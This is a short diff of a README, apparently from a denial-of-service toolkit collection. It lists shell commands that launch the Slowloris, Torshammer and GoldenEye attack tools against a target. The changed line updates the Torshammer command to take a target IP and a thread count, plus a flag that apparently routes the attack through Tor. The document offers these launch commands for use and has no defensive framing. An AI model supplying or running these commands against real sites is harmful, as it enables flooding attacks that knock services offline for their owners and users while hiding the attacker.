@@ -11,7 +11,7 @@
 **cd slowloris && chmod +x * && python2 setup.py && python2 slowloris.py**
 
 ## Torshammer-ATTACK :-
-**cd Torshammer && chmod +x * && python2 Torshammer.py YOUR_SITE_ATTACK**
+**cd Torshammer && chmod +x * && python torshammer.py -t IP_TARGET  -r NUMBER_THRED -T**
 
 ## GoldenEye
 **cd GoldenEye && chmod +x * && ./goldeneye.py url OPTIONS**
